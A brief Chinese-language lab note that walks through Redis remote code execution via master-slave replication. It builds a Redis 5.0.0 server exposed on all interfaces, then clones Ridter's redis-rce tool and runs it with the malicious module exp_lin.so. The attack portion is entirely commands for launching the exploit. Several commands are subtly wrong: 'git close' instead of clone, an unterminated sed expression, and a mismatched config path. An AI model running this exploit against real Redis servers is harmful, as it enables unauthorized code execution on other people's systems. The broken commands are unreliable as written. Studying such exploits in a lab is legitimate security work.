## Redis基于主从复制的RCE利用方式
**参考：**
- https://mp.weixin.qq.com/s/cOdCbO17Jq_J1XnpsxplZg
- https://paper.seebug.org/975/

### 环境搭建

redis环境配置：
```bash
cd /root
wget http://download.redis.io/releases/redis-5.0.0.tar.gz
tar xzf redis-5.0.0.tar.gz
cd redis-5.0.0
make
sed -i 's/127.0.0.1/0.0.0.0' redis.conf
cd src
./redis-server /root/redis-5.0.0.0/redis.conf
```


### 攻击
下载脚本并攻击
```bash
git close https://github.com/Ridter/redis-rce
cd redis-rce
python3 redis-rce.py -r 127.0.0.1 -L 127.0.0.1 -f exp_lin.so
```
![](/images/19-7-10_SQL_Redis基于主从复制的RCE利用方式_1.png)
![](/images/19-7-10_SQL_Redis基于主从复制的RCE利用方式_2.png)